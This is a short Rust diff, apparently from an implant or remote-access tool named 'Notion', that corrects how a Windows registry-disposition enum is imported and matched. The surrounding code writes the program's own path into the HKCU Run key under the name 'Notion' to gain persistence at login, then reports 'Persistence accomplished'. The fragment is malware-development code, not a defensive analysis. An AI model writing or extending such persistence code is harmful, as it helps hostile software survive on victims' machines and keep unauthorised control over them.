@@ -5,7 +5,7 @@ use is_root::is_root;
 use crate::cmd::{CommandArgs, shell, save, notion_out};
 #[cfg(not(windows))] use std::fs::{create_dir, copy, write};
 #[cfg(windows)] use std::path::Path;
-#[cfg(windows)] use winreg::{RegKey};
+#[cfg(windows)] use winreg::{RegKey, enums::RegDisposition};
 #[cfg(windows)] use std::fs::copy as fs_copy;
 #[cfg(windows)] use winreg::enums::HKEY_CURRENT_USER;
 #[cfg(windows)] use std::process::Command;
@@ -58,8 +58,8 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
                     let path = Path::new(r"Software\Microsoft\Windows\CurrentVersion\Run");
                     let (key, disp) = hkcu.create_subkey(&path)?;
                     match disp {
-                        REG_CREATED_NEW_KEY => logger.info(log_out!("A new key has been created")),
-                        REG_OPENED_EXISTING_KEY => logger.info(log_out!("An existing key has been opened")),
+                        RegDisposition::REG_CREATED_NEW_KEY => logger.info(log_out!("A new key has been created")),
+                        RegDisposition::REG_OPENED_EXISTING_KEY => logger.info(log_out!("An existing key has been opened")),
                     };
                     key.set_value("Notion", &persist_path)?;
                     notion_out!("Persistence accomplished")
